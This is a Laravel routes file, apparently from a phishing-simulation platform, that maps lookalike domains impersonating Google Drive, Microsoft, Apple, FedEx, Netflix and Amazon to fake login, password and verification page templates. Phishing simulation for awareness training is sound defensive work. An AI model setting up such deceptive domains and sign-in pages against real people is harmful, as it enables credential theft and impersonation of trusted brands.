<?php
use Illuminate\Support\Facades\Route;

// Routes for drive.googles-docviewer.com
Route::domain('drive.googles-docviewer.com')->group(function () {
    Route::get('/login', function () {
        return view('sim-template.googledrive.login');
    })->name('googledrive.login');

    Route::get('/pwd', function () {
        return view('sim-template.googledrive.pwd');
    })->name('googledrive.pwd');

    Route::get('/verification', function () {
        return view('sim-template.googledrive.verification');
    })->name('googledrive.verification');
});

// Routes for renew.microsoft-billing-secure.com
Route::domain('renew.microsoft-billing-secure.com')->group(function () {
    Route::get('/login', function () {
        return view('sim-template.microsoft.login');
    })->name('microsoft.login');

    Route::get('/pwd', function () {
        return view('sim-template.microsoft.pwd');
    })->name('microsoft.pwd');
});

// Routes for appleid.support-verify-login.com
Route::domain('appleid.support-verify-login.com')->group(function () {
    Route::get('/login', function () {
        return view('sim-template.apple.login');
    })->name('apple.login');
});

// Routes for fedex-shipment-confirm.com
Route::domain('fedex-shipment-confirm.com')->group(function () {
    Route::get('/secure-login', function () {
        return view('sim-template.fedex.login');
    })->name('fedex.login');
});

// Routes for netflix-billing-check.com
Route::domain('netflix-billing-check.com')->group(function () {
    Route::get('/login', function () {
        return view('sim-template.netflix.login');
    })->name('netflix.login');
});

// Routes for amazon-rewards-win.com
Route::domain('amazon-rewards-win.com')->group(function () {
    Route::get('/signin', function () {
        return view('sim-template.amazon.login');
    })->name('amazon.login');

    Route::get('/ap/signin', function () {
        return view('sim-template.amazon.signin');
    })->name('amazon.password');
});
